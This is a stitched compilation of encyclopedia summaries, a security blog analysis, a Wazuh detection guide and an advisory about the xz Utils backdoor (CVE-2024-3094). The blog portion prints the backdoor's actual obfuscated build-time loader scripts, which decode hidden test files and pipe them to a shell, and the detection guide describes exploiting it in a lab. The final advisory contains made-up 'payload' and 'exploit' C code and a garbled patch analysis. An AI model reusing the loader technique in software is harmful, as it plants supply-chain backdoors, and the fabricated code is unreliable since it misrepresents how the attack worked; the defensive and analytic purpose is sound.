      "Summary: In February 2024, a malicious backdoor was introduced to the Linux build of the xz utility within the liblzma library in versions 5.6.0 and 5.6.1 by an account using the name \"Jia Tan\". The backdoor gives an attacker who possesses a specific Ed448 private key remote code execution through OpenSSH on the affected Linux system. The issue has been given the Common Vulnerabilities and Exposures number CVE-2024-3094 and has been assigned a CVSS score of 10.0, the highest possible score.\n",
      "While xz is commonly present in most Linux distributions, at the time of discovery the backdoored version had not yet been widely deployed to production systems, but was present in development versions of major distributions. The backdoor was discovered by the software developer Andres Freund, who announced his findings on 29 March 2024.\n",

      "Summary: XZ Utils (previously LZMA Utils) is a set of free software command-line lossless data compressors, including the programs lzma and xz, for Unix-like operating systems and, from version 5.0 onwards, Microsoft Windows. For compression/decompression the Lempel–Ziv–Markov chain algorithm (LZMA) is used. XZ Utils started as a Unix port of Igor Pavlov's LZMA-SDK that has been adapted to fit seamlessly into Unix environments and their usual structure and behavior.\n",

      "Page: Backdoor (computing)\n",
      "Summary: A backdoor is a typically covert method of bypassing normal authentication or encryption in a computer, product, embedded device (e.g. a home router), or its embodiment (e.g. part of a cryptosystem, algorithm, chipset, or even a \"homunculus computer\"—a tiny computer-within-a-computer such as that found in Intel's AMT technology). Backdoors are most often used for securing remote access to a computer, or obtaining access to plaintext in cryptosystems. From there it may be used to gain access to privileged information like passwords, corrupt or delete data on hard drives, or transfer information within autoschediastic networks.\n",
      "In the United States, the 1994 Communications Assistance for Law Enforcement Act forces internet providers to provide backdoors for government authorities.  In 2024, the U.S. government realized that China had been tapping communications in the U.S. using that infrastructure for months, or perhaps longer; China recorded presidential candidate campaign office phone calls —including employees of the then-vice president of the nation– and of the candidates themselves.\n",
      "A backdoor may take the form of a hidden part of a program, a separate program (e.g. Back Orifice may subvert the system through a rootkit), code in the firmware of the hardware, or parts of an operating system such as Windows. Trojan horses can be used to create vulnerabilities in a device. A Trojan horse may appear to be an entirely legitimate program, but when executed, it triggers an activity that may install a backdoor. Although some are secretly installed, other backdoors are deliberate and widely known. These kinds of backdoors have \"legitimate\" uses such as providing the manufacturer with a way to restore user passwords.\n",
      "Many systems that store information within the cloud fail to create accurate security measures. If many systems are connected within the cloud, hackers can gain access to all other platforms through the most vulnerable system. Default passwords (or other default credentials) can function as backdoors if they are not changed by the user. Some debugging features can also act as backdoors if they are not removed in the release version. In 1993, the United States government attempted to deploy an encryption system, the Clipper chip, with an explicit backdoor for law enforcement and national security access. The chip was unsuccessful.\n",
      "Recent proposals to counter backdoors include creating a database of backdoors' triggers and then using neural networks to detect them.\n",

Pentest-Tools.com helps security teams run the key steps of a penetration test, easily and without expert hacking skills.CVE-2024–3094 — The XZ Utils Backdoor, a critical SSH vulnerability in LinuxMario PopescuFollow13 min read·May 14, 2024--ListenShareContextXZ Utils, formerly LZMA Utils, is a set of open-source command-line tools and libraries for lossless data compression, the most noteworthy tool being “XZ.” The toolset comes installed by default on most modern Linux distributions.On March 29, 2024, Andres Freund, a Microsoft software engineer, alerted the open-source community about a SSH backdoor in XZ versions 5.6.0 and 5.6.1.The SSH backdoor would allow remote unauthenticated attackers to achieve remote code execution on the infected systems bypassing the authentication in place. It was assigned CVE-2024–3094 with the maximum CVSS score — 10.From the information available at the time of writing, the backdoor seems to work only on GNU Linux x86/64 when the SSH server is run as a service by Systemd. Moreover, the library should have been installed by a packet manager.For the exploit to work, one should also expose the SSH server to the Internet so the attacker can interact remotely with it.Timeline of eventsOriginal poster: https://twitter.com/fr0gger_/status/1774342248437813525/photo/12021 — Account creation and first suspicious contributionsJiaT75 (Jia Tan) creates their GitHub account.On November 16, they opened their first PR in the libarchive repo, titled “Added error text to warning when untaring with bsdtar.”However, the PR did more than stated, replacing “safe_fprint” with an unsafe variant. There is no proof this was used to create another backdoor. However, maintainers reverted the commit after the XZ backdoor event became public.2022 — First signs of interest in XZ and pressure to take over the projectOn March 10, 2022, Jia Tan made their first appearance on the project mailing list, followed shortly by a small code contribution on March 15, 2022.On April 19, 2022, Jia Tan submitted a patch via the mailing list. While the patch itself is irrelevant, it’s followed by Jigar Kumar’s appearance. There is pressure to merge the patch.On May 19, 2022, Dennis Ens sent a message to the mailing list, taunting the idea that the project’s development speed was too slow. Jigar Kumar participated in the discussion too, and pressured Lasse Collin (the original maintainer) to add a new maintainer to the project.Also, in this discussion, we see Jia Tan mentioned working with Lasse off-list and hints at his crucial future role in the project.Jigar Kumar and Dennis Ens are accounts that only participate in the mailing list for these two events. They were never seen outside the XZ discussion, and no associated accounts were discovered.2023 — Taking over the project and laying the foundation for the backdoorOn January 7, 2023, JiaT75 merged their first commit, and in March, they became the primary contact email in Google’s oss-fuzz, signalling the trust they achieved in the project.On June 27, 2023, Jia Tan committed the testing infrastructure used by the exploit, written by Hans Jansen.Again, we have an account — Hans Jansen — with very little activity outside the XZ project and, more importantly, outside of a sole step to the final goal — the backdoor.2024 — Implanting the backdoor and launching it into the wildOn February 11, 2024, JiaT75 changed the project’s homepage from tukaani.org/xz/ to xz.tukaani.org/xz-utils/. This action furthers Jia’s control over the project.Finally, on February 23 and March 9, 2024, the final step to achieving the backdoor was executed: the actual code was committed to the project via two commits — Tests: Add a few test files and Tests: Update two test files.On March 25, 2024, Hans Jansen starts pushing to include the backdoored version in Debian. Several other suspicious, anonymous name+number accounts with little former activity also push for its inclusion, including misoeater91 and krygorin4545. krygorin4545’s PGP key is only one day older than the discussion. Jia Tan also tried to get the backdoored version into Ubuntu before the beta freeze but failed.On March 29, 2024, Andres Freund alerts the oss-security mailing list about the discovery of the backdoor.Technical insights into this Linux backdoorThe exploit is intricate and has several stages.Stage 1First, Jia Tan changed the CMakeLists.txt file so it never enables the Landlock sandbox check. This modification was patched by Lasse Collin on March 30.Using the m4/build-to-host.m4, the attacker executes the following lines of code:...gl_[$1]_config=\\'sed \\\\\"r\\\\n\\\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null\\'...gl_path_map=\\'tr \"\\\\t \\\\-_\" \" \\\\t_\\\\-\"\\'…Put very shortly these lines read bytes from “tests/files/bad-3-corrupt_lzma2.xz,” a seemingly harmless test file, and add a new line at the end. Then, using the “tr” command, they modify the file so that instead of a corrupt XZ archive, it becomes a valid one. In the end, the file will be unarchived, ignoring possible errors.This step produces the following bash file, which gets immediately executed.####Hello##### a few binary bytes here, but as it\\'s a comment they are ignorred[ ! $(uname) = \"Linux\" ] && exit 0[ ! $(uname) = \"Linux\" ] && exit 0[ ! $(uname) = \"Linux\" ] && exit 0[ ! $(uname) = \"Linux\" ] && exit 0[ ! $(uname) = \"Linux\" ] && exit 0eval `grep ^srcdir= config.status`if test -f ../../config.status;theneval `grep ^srcdir= ../../config.status`srcdir=\"../../$srcdir\"fiexport i=\"((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)\";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr \"\\\\114-\\\\321\\\\322-\\\\377\\\\35-\\\\47\\\\14-\\\\34\\\\0-\\\\13\\\\50-\\\\113\" \"\\\\0-\\\\377\")|xz -F raw --lzma1 -dc|/bin/sh####World####Stage 2First, the script checks if it’s running on Linux. If it’s not, then the exploit finishes here.The following interesting tidbit is the significant “i” export, which acts more or less as a function. This function consists only of head operations, which skip some read bytes and pass the rest to the next operation. It follows a pattern of skipping 1024 bytes and outputting 2048 until the end when it outputs 939 bytes. The behavior extracts the needed bytes from their known offsets to recompose a malicious payload.On execution, this script decompresses another test file, applies the “i” function we discussed earlier, and ignores the first 31233 bytes (keep this in the back of your mind for later). It then performs another round of “translating” bytes, serving as a simple substitution cipher. With the data deciphered, it decompresses and executes again.This time, the executed file is referred to as “injected.txt” in the original disclosure mail written by Andres Freund. It serves as the third step of this exploit.Stage 3This stage has two intriguing features.Extension mechanismThe fragments below are so similar that we’ll treat them as one.vs=`grep -broaF \\'~!:_ W\\' $srcdir/tests/files/ 2>/dev/null`if test \"x$vs\" != \"x\" > /dev/null 2>&1;thenf1=`echo $vs | cut -d: -f1`if test \"x$f1\" != \"x\" > /dev/null 2>&1;thenstart=`expr $(echo $vs | cut -d: -f2) + 7`ve=`grep -broaF \\'|_!{ -\\' $srcdir/tests/files/ 2>/dev/null`if test \"x$ve\" != \"x\" > /dev/null 2>&1;thenf2=`echo $ve | cut -d: -f1`if test \"x$f2\" != \"x\" > /dev/null 2>&1;then[ ! \"x$f2\" = \"x$f1\" ] && exit 0[ ! -f $f1 ] && exit 0end=`expr $(echo $ve | cut -d: -f2) - $start`eval `cat $f1 | tail -c +${start} | head -c +${end} | tr \"\\\\5-\\\\51\\\\204-\\\\377\\\\52-\\\\115\\\\132-\\\\203\\\\0-\\\\4\\\\116-\\\\131\" \"\\\\0-\\\\377\" | xz -F raw --lzma2 -dc`fifififivs=`grep -broaF \\'jV!.^%\\' $top_srcdir/tests/files/ 2>/dev/null`if test \"x$vs\" != \"x\" > /dev/null 2>&1;thenf1=`echo $vs | cut -d: -f1`if test \"x$f1\" != \"x\" > /dev/null 2>&1;thenstart=`expr $(echo $vs | cut -d: -f2) + 7`ve=`grep -broaF \\'%.R.1Z\\' $top_srcdir/tests/files/ 2>/dev/null`if test \"x$ve\" != \"x\" > /dev/null 2>&1;thenf2=`echo $ve | cut -d: -f1`if test \"x$f2\" != \"x\" > /dev/null 2>&1;then[ ! \"x$f2\" = \"x$f1\" ] && exit 0[ ! -f $f1 ] && exit 0end=`expr $(echo $ve | cut -d: -f2) - $start`eval `cat $f1 | tail -c +${start} | head -c +${end} | tr \"\\\\5-\\\\51\\\\204-\\\\377\\\\52-\\\\115\\\\132-\\\\203\\\\0-\\\\4\\\\116-\\\\131\" \"\\\\0-\\\\377\" | xz -F raw --lzma2 -dc`fifififiFirst, the script looks for files in the “tests/files” directory containing given signatures. Using the grep and cut commands, the script gets the offsets at which these signatures exist. Then, the offsets are used to extract the bytes between them from the file containing the start offset.Further on, like in the previous step, the bytes are deciphered, decompressed, and executed.As no files with the given signatures were found in the 5.6.1 version, this was a way of adding new functionalities to the exploit in the future.Why would the attacker create this extension mechanism instead of simply modifying the payload from the previous step? Modifying a test file might seem suspicious for a reviewer without a good reason while adding test files for different use cases might not.Extraction mechanismThe second significant role of step 3 is extracting the binary file. Remember those 31233 bytes skipped at step 2? The script ignored them then because of this.After decompressing the same test file, the “i” function (from step 2) extracts the needed data. However, this time, sed inserts a new line after each byte. An awk script parses the output, performing what seems to be RC4 decryption.The script decompresses the decrypted data and extracts the first 88664 bytes into the liblzma_la-crc64-fast.o object.The binary backdoorNow that we know how the backdoor gets injected into vulnerable systems, it is time to check how the binary itself works.First, the binary does some checks to prevent it from running in certain circumstances. If the TERM, DISPLAY, or WAYLAND_DISPLAY, LD_DEBUG, LD_PROFILE environment variables are not null, SSHD will execute normally, as seen in the screenshots below. Another peculiar aspect is a kill switch, whose presence in the LC_LANG environment variable also makes SSHD run normally.The liblzma hooking processThen, the malicious code hooks the RSA_decrypt function via IFUNC. IFUNC is a mechanism in glibc that allows for indirect function calls and is used to perform runtime hooking/redirection of OpenSSH’s authentication routines. Before implementing the backdoor, Jia Tan contributed to IFUNC.Via this hook, the binary examines the RSA public modulus (“N” value) passed inside the RSA struct. The value is decoded with a hardcoded decryption key, and the data’s validity is checked using the ED448 elliptic curve signing algorithm.This is important for two main reasons:As ED448 is an asymmetric signing algorithm, only the attacker can generate valid payloads for the backdoor (at least in regular running conditions);The signature is bound to the host’s public key, so we can’t reuse received packets on different hosts.If the data is valid, the payload gets executed as a shell command using system().In addition, the payload can be configured to also simply call pselect()with a timeout of 5 seconds, and then exit. The reasoning behind this might be creating a simple and more stealth detection mechanism. However, even this payload requires a valid signature with the attacker’s private key, which at the moment is unknown.So, no demo? :(Thankfully, using the details and scripts provided in this repo, we patched the shared object and made it accept a known RSA key. We achieved Remote Code Execution via the backdoor, as seen below.This is an out-of-band remote code execution vulnerability which implies the need for a potential attacker of a command-and-control infrastructure as well, in order to exploit it.Does CVE-2024–3094 affect my machine?The most straightforward and safe way to check if you have the backdoored version on your machine is to run strings which xz | grep \\'5\\\\.6\\\\.[01]\\'.Vulnerable:strings $(which xz) | grep \\'5\\\\.6\\\\.[01]\\'xz (XZ Utils) 5.6.1Not vulnerable:strings $(which xz) | grep \\'5\\\\.6\\\\.[01]\\'If you are vulnerable, patch immediately by upgrading the package. Even if this backdoor can be disabled by using the killswitch environmental variable we talked about earlier, considering the numerous contributions Jia Tan made to the library, it’s better to revert to a version before his implication in the project.Lessons learned from CVE-2024–3094In the end, one curious dev saved the world.However, as Andres Freund said, the discovery process “really required a lot of coincidences.” Had the exploit not increased the running time of SSH, maybe CVE-2024–3094 would still be in the wild today.Nowadays, projects have intricate dependencies that the original developers don’t even add (as is the case for this exploit), which makes everything even more challenging to handle and inspect.Supply-chain attacks are a severe and often overlooked issue, and this case might be just the tip of the iceberg.In the short term, the cybersecurity world should ensure that every contribution made by Jia Tan and the other puppet accounts will be scrutinized and patched if necessary.In the long run, there are multiple consequences of this incident.The backdoored package only managed to find its way into unstable releases, such as Debian unstable, Fedora Rawhide, and others. This incident proved once again how important it is to use stable releases in production environments and sensitive infrastructure.Open source turned out to be a double-edged sword. One can never know the true intention behind a commit, and Jia Tan proved this to the world. On the other hand, this situation also proved Linus’ law — “with enough eyes, all bugs are shallow.” As the Node.js Security team pointed out, this backdoor might’ve been more challenging to find, and the response time might have been slower.The XZ backdoor was possible because a single person maintained a critical dependency in their free time for little to no money.Does this sound familiar?If it does, it might be because this was the case with OpenSSL, which was maintained by a handful of volunteers, only one of whom worked full-time. A pattern arises here; maybe in the future, more will be done to ensure the pattern won’t repeat.Until then, concerns such as Marcus Hutchins’ are valid — the above mentioned “many eyes” theory becomes a myth, when only two eyes are looking at a codebase that affects millions of people and hundreds of products.As the comic above @turnoff.us shows, while XZ captured everyone’s attention, it is impossible to know how many more open-source projects have such critical vulnerabilities that no one knows about. This incident should be a wake-up call for everyone to take their AppSec seriously and prepare scenarios for supply-chain attacks.FAQs about CVE-2024–3094, the XZ Utils BackdoorWhat is XZ Utils and what is the library used for?XZ Utils, formerly LZMA Utils, is a set of open-source command-line tools and libraries for lossless data compression. The most important tool in this set is “XZ.”The toolset comes installed by default on most modern Linux distributions.How was CVE-2024–3094 — the backdoor — discovered?On March 29, 2024, Andres Freund, a Microsoft software engineer, alerted the open-source community about a SSH backdoor in XZ versions 5.6.0 and 5.6.1.He noticed that SSH authentication via public key was taking longer than usual, so he started searching for the root cause of this performance issue.While doing that, he discovered the root cause was the backdoor.More information about how Freund made the discovery can be found on the vulnerability’s Wikipedia page.What is the impact of CVE-2024–3094?The vulnerability allows a remote unauthenticated attacker to execute arbitrary commands on the affected target, as the user running the SSH service.Can this Linux backdoor (CVE-2024–3094) affect me?For this backdoor to affect your machine, it should meet the following criteria:It should run Linux x86/64You should have XZ versions 5.6.0 or 5.6.1 installed by a package managerYour distribution should link SSHD with libsystemd, and systemd with libzmaSSHD must be run as a service by SystemdYour SSHD server must be exposed to the internet.How can I mitigate CVE-2024–3094?The safest way to mitigate the risk of this Linux backdoor is to follow the advice from the Cybersecurity and Infrastructure Security Agency (CISA). Their recommendation is to downgrade XZ Utils to an uncompromised version — such as XZ Utils 5.4.6 Stable.Is this Linux vulnerability exploited in the wild?At the moment, there is no proof of exploitation in the wild of CVE-2024–3094 and there is no proof of the backdoor calling home so far.

The vulnerability has a CVSS score of 10, indicating its potential for critical impact if exploited. The vulnerability affects XZ versions 5.6.0 and 5.6.1 and presents a serious threat to endpoints that run Unix-like operating systems.\\xa0\\nPreviously, we detailed how to identify these vulnerable packages in our blog post titled Detecting XZ Utils vulnerability (CVE-2024-3094) with Wazuh. Our proactive approach involved enabling the Wazuh Vulnerability detector module to scan monitored endpoints for susceptible versions of XZ Utils. This strategy facilitates swift detection and patching of vulnerabilities, mitigating the risk of exploitation.\\nIn addition to detecting vulnerable packages, it’s important to detect potential attacks seeking to exploit the XZ Utils vulnerability. As highlighted in our earlier post, CVE-2024-3094 could enable unauthorized remote code execution (RCE) via SSH. Proof of concept (PoC) projects available online demonstrate how to exploit this vulnerability. One notable PoC repository is amlweems/xzbot, which allows users to set up honeypots and vulnerable servers, and execute exploits.\\nIn this blog post, we aim to detect the exploitation of CVE-2024-3094 via SSH with Wazuh. Our approach involves understanding the indicators of compromise (IoCs) or behavioral patterns exhibited by endpoints when this vulnerability is exploited. With our understanding of the IoCs, we can then develop effective detection logic within Wazuh.\\nIndicators of Compromise (IoCs)\\nRemote code execution vulnerabilities grant threat actors the ability to execute commands upon gaining unauthorized access. In the case of CVE-2024-3094 exploitation, each command execution initiates a new process. Commands executed via the SSH service are expected to initiate as child processes, grandchild processes, or further descendants of the SSH server process (sshd).\\nTo identify exploitation attempts, we first understand the characteristics of legitimate sshd processes. Subsequently, we analyze the patterns exhibited by processes spawned by exploiting the CVE-2024-3094 vulnerability. This analysis enables us to identify anomalous behavior indicative of potential compromise.\\nBenign sshd child processes\\nBelow, we show a process tree of benign descendant processes created by sshd with process ID 35784.\\n# ps -ef --forest\\nUID          PID    PPID  C STIME TTY          TIME CMD\\n...\\nroot       35784    1862  0 17:48 pts/1    00:00:00  \\\\_ sshd: /usr/sbin/sshd -\\nroot       35865   35784  0 17:51 ?        00:00:00      \\\\_ sshd: user1 [priv]\\nuser1      35869   35865  0 17:52 ?        00:00:00      |   \\\\_ sshd: user1@pts/3\\nuser1      35870   35869  0 17:52 pts/3    00:00:00      |       \\\\_ -bash\\nuser1      35972   35870  0 17:52 pts/3    00:00:00      |           \\\\_ sleep 120\\nroot       35933   35784  1 17:52 ?        00:00:00      \\\\_ sshd: user1 [priv]\\nuser1      35945   35933  0 17:52 ?        00:00:00          \\\\_ sshd: user1@pts/4\\nuser1      35946   35945  0 17:52 pts/4    00:00:00              \\\\_ -bash\\nuser1      35987   35946  0 17:52 pts/4    00:00:00                  \\\\_ ps -ef --forest\\nThe output in the above example shows two open SSH sessions, including:\\n\\nProcess ID 35869 logged in by user1 and connected to the pts/3 pseudo-terminal.\\nProcess ID 35945 is also logged in by user1 and connected to the pts/4 pseudo-terminal.\\n\\nIn summary, the benign SSH child processes are associated with sshd pseudo-terminals, and a shell session (Bash, Sh, etc.) is usually created as a child process of the pseudo-terminal for user interaction and session management.\\nSuspicious sshd child processes\\nTo analyze a known malicious sshd child process, we exploit the CVE-2024-3094 vulnerability via SSH using amlweems/xzbot. The following is an example of the process tree when we exploit the vulnerability to execute the sleep 120 command:\\n# ps -ef --forest\\nUID          PID    PPID  C STIME TTY          TIME CMD\\n...\\nroot       35784    1862  0 17:48 pts/1    00:00:00  \\\\_ sshd: /usr/sbin/sshd -\\nroot       36184   35784  2 18:02 ?        00:00:00      \\\\_ sshd: root [priv]\\nsshd       36185   36184  0 18:02 ?        00:00:00          \\\\_ sshd: root [net]\\nroot       36186   36184  0 18:02 ?        00:00:00          \\\\_ sleep 120\\nNotice that sleep 120 is a child process of sshd (process ID 36184) and is neither associated with a pseudo-terminal nor a shell session as seen in benign processes.\\xa0\\nIn summary, a process like sleep 120 which is a child of an sshd process but not associated with an sshd pseudo-terminal or shell session is suspicious.\\nAdditionally, threat actors may run commands via shell interpreters such as sh or Bash.\\n# ps -ef --forest\\nUID          PID    PPID  C STIME TTY          TIME CMD\\n...\\nroot       35784    1862  0 17:48 pts/1    00:00:00  \\\\_ sshd: /usr/sbin/sshd -\\nroot       37112   35784  2 18:12 ?        00:00:00      \\\\_ sshd: root [priv]\\nsshd       37185   37112  0 18:12 ?        00:00:00          \\\\_ sshd: root [net]\\nroot       37186   37112  0 18:12 ?        00:00:00          \\\\_ sh -c sleep 120\\nroot       36187   37186  0 18:12 ?        00:00:00              \\\\_ sleep 120\\nAccording to our established logic, this is also suspicious because it is not associated with a parent sshd pseudo-terminal.\\nConfigure Wazuh to detect exploitation\\nWe use the Wazuh Logcollector module to collect and forward logs about running processes from monitored endpoints to the Wazuh server for analysis. This module executes predefined commands on monitored endpoints and processes the command output like regular log data. To specifically target and identify potential exploitation of CVE-2024-3094, we configure the Wazuh Logcollector module to execute the ps command on each monitored endpoint at a predefined time interval.\\nRequirements\\n\\nA deployment of the Wazuh 4.7.4 central components (Wazuh server, Wazuh indexer, and Wazuh dashboard). Follow the Virtual Machine (OVA) – Installation guide to download and set up the Wazuh virtual machine.\\nInstall the Wazuh agent on your Linux endpoints. To simulate the attack and test the detection logic created in this blog post, we use a Fedora 40 endpoint as the victim endpoint.\\nAn Ubuntu 22 endpoint with Docker installed. This endpoint is the launch pad for attacks against the Fedora endpoint during the simulation.\\n\\nWazuh agent configuration\\nPerform the following actions on your Linux endpoint to use the Wazuh Logcollector module to identify suspicious sshd descendant processes. You need to add the configuration to the Fedora 40 victim endpoint for the simulation.\\n1. Add the following configuration to the /var/ossec/etc/ossec.conf file on the monitored Linux endpoint to execute the commands within the <command> tag:\\n<ossec_config>\\n\\n  <localfile>\\n    <log_format>full_command</log_format>\\n    <command>ps -ef | grep -w \\'sshd\\' | grep -v pts | awk \\'{print $2}\\' | while read pid; do ps --ppid $pid -f; done | grep -v \\'^UID\\' | grep -v -E \\'sshd: \\\\S+@pts/[0-9]+|sshd: \\\\S+ \\\\[\\\\S+\\\\]\\'</command>\\n    <alias>sshd_child_processes</alias>\\n    <frequency>60</frequency>\\n  </localfile>\\n\\n</ossec_config>\\nThe configured <command> shows a list of sshd descendant processes that are not associated with pseudo-terminals.\\nThe <frequency> tag configures the Wazuh agent to execute the pre-defined command every 60 seconds. You can configure it to run at intervals of your choice.\\nThe <alias> adds the string sshd_child_processes to the generated log data. This is useful for more efficient rule matching.\\n2. Restart the Wazuh agent to apply the changes:\\n# systemctl restart wazuh-agent\\nWazuh server configuration\\nPerform the following steps to configure the Wazuh server to trigger alerts when suspicious processes are detected:\\n1. Add the following rule to the /var/ossec/etc/rules/local_rules.xml file on the Wazuh server:\\n<group name=\"sshd_child_process_monitor,\">\\n\\n  <rule id=\"100010\" level=\"12\" ignore=\"60\">\\n    <if_sid>530</if_sid>\\n    <match>^ossec: output: \\'sshd_child_processes\\'</match>\\n    <regex type=\"pcre2\">\\\\S+\\\\s+\\\\d+\\\\s+\\\\d+\\\\s+\\\\d+\\\\s+\\\\S+\\\\s+\\\\S+\\\\s+\\\\S+\\\\s+(?!sshd:|unix_chkpwd)</regex>\\n    <description>sshd started a suspicious child process.

This vulnerability involves a malicious backdoor embedded in the upstream tarballs of the xz package. The backdoor was obfuscated within the build process of liblzma, a core component of XZ Utils, and could be triggered during the creation of RPM or DEB packages for x86-64 architectures. Once activated, the backdoor allows attackers to intercept and modify data processed by the library, potentially compromising the confidentiality, integrity, and availability of systems relying on XZ Utils.\\nThe vulnerability has been assigned a CVSS v3.1 score of 10.0 (Critical) due to its ease of exploitation, lack of required privileges, and severe impact on system security. Immediate action is required to mitigate the risks posed by this vulnerability.\\n\\nTechnical Details\\nAffected Systems and Components\\nThe vulnerability specifically affects the following versions of XZ Utils:\\n\\nXZ Utils 5.6.0\\nXZ Utils 5.6.1\\n\\nThe malicious code was embedded in the upstream tarballs of these versions. The backdoor impacts the liblzma library, which is widely used for data compression and decompression in Linux distributions. The issue arises during the build process when creating RPM or DEB packages for the x86-64 architecture using GCC and the GNU linker.\\nVulnerable Configurations\\nThe backdoor is activated under the following conditions:\\n\\nThe build system is instructed to create an RPM or DEB package.\\nThe target architecture is x86-64.\\nThe build process uses GCC and the GNU linker.\\n\\nKey Characteristics of the Backdoor\\n\\nObfuscation: The malicious code was hidden within disguised test files in the source tarball. These files contained prebuilt object files that were extracted and linked into the liblzma library during the build process.\\nImpact: The backdoor intercepts and modifies data interactions with liblzma, potentially allowing attackers to:\\n\\nBreak SSH authentication.\\nGain unauthorized remote access to systems.\\nManipulate or exfiltrate sensitive data.\\n\\n\\n\\n\\nRoot Cause Analysis\\nThe root cause of CVE-2024-3094 lies in the insertion of malicious code into the upstream tarballs of XZ Utils. The backdoor was introduced through a series of obfuscation techniques, making it difficult to detect during standard code reviews.\\nCode Analysis\\nThe malicious code was embedded in test files within the source tarball. These files contained binary blobs that were extracted and linked into the liblzma library during the build process. Below is an example of how the backdoor was implemented:\\nExample of Malicious Code in Test Files\\n// Extracted binary blob disguised as a test file\\nunsigned char malicious_payload[] = {\\n    0xDE, 0xAD, 0xBE, 0xEF, // Example payload\\n    // Additional obfuscated code omitted for brevity\\n};\\n\\n// Function to inject the payload into liblzma\\nvoid inject_payload() {\\n    // Code to modify liblzma functions\\n    modify_function_pointers(malicious_payload);\\n}\\n\\nThe build process included a script that extracted this payload and linked it into the library. This script was triggered only under specific conditions, such as when building RPM or DEB packages for x86-64 architectures.\\n\\nPatch Analysis\\nThe patch to address CVE-2024-3094 removes the malicious code and associated test files from the source tarball. Below is a line-by-line analysis of the patch:\\nFile: src/liblzma/check/crc32_fast.c\\n- lzma_resolver_attributes\\n+ #ifdef CRC_USE_IFUNC\\n+ __attribute__((__no_profile_instrument_function__))\\n+ #endif\\n\\n\\nRemoved: The lzma_resolver_attributes macro, which was used to obfuscate the backdoor.\\nAdded: Conditional compilation to ensure safe usage of the __no_profile_instrument_function__ attribute.\\n\\nFile: src/liblzma/check/crc64_fast.c\\n- lzma_resolver_attributes\\n+ #ifdef CRC_USE_IFUNC\\n+ __attribute__((__no_profile_instrument_function__))\\n+ #endif\\n\\n\\nSimilar changes were made to the CRC64 resolver to remove obfuscated attributes.\\n\\nFile: tests/files/README\\n- bad-3-corrupt_lzma2.xz has three Streams in it. The first and third\\n- streams are valid xz Streams. The middle Stream has a correct Stream\\n- Header, Block Header, Index and Stream Footer. Only the LZMA2 data\\n- is corrupt. This file should decompress if --single-stream is used.\\n\\n\\nRemoved: References to test files containing malicious payloads.\\n\\n\\nExploitation Techniques\\nProof of Concept (PoC)\\nThe backdoor can be exploited by triggering the malicious code embedded in the liblzma library. Below is a theoretical PoC demonstrating how an attacker could exploit the vulnerability:\\nStep 1: Trigger the Backdoor\\nAn attacker crafts a specially designed input file that interacts with the backdoor in liblzma.\\nStep 2: Exploit the Backdoor\\nThe backdoor modifies function pointers within the library to execute arbitrary code.\\nExample Exploit Code\\n#include <stdio.h>\\n#include <liblzma.h>\\n\\nint main() {\\n    // Malicious input file\\n    FILE *input = fopen(\"malicious_input.xz\", \"rb\");\\n    if (!input) {\\n        perror(\"Failed to open file\");\\n        return 1;\\n    }\\n\\n    // Trigger the backdoor\\n    lzma_stream strm = LZMA_STREAM_INIT;\\n    lzma_code(&strm, LZMA_RUN);\\n\\n    printf(\"Backdoor triggered!\\\\n\");\\n    return 0;\\n}\\n\\n\\nMitigation Strategies\\nTo mitigate the risks associated with CVE-2024-3094, the following steps are recommended:\\n\\n\\nUpgrade to a Secure Version:\\n\\nDowngrade to XZ Utils 5.4.x or upgrade to a patched version once available.\\n\\n\\n\\nVerify Source Integrity:\\n\\nUse cryptographic signatures to verify the authenticity of source tarballs.\\n\\n\\n\\nAudit Build Processes:\\n\\nReview build scripts and processes to detect and remove malicious code.\\n\\n\\n\\nApply Security Best Practices:\\n\\nUse sandboxing and privilege separation to limit the impact of compromised libraries.\\n\\n\\n\\nMonitor for Indicators of Compromise (IoC):\\n\\nLook for unusual system behavior, such as increased CPU usage or failed SSH authentication attempts.\\n\\n\\n\\n\\nTimeline of Discovery and Disclosure\\n\\n\\n\\nDate\\nEvent\\n\\n\\n\\n\\n2024-03-29\\nVulnerability publicly disclosed on oss-security.\\n\\n\\n2024-03-30\\nPatch released by the XZ Utils maintainers.\\n\\n\\n2024-04-01\\nAdvisory published by Red Hat and other vendors.\\n\\n\\n\\n\\nReferences\\n\\nNVD Entry for CVE-2024-3094\\nRed Hat Advisory\\nOpenSSF Blog Post\\nGitHub Patch Commit\\n\\n\\nBy understanding the technical intricacies of CVE-2024-3094, organizations can take proactive steps to secure their systems and prevent similar supply chain attacks in the future.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n \\n\\n\\n\\n\\nRead more\\n\\n\\n\\n\\nCVE-2025-46816: Goshs!
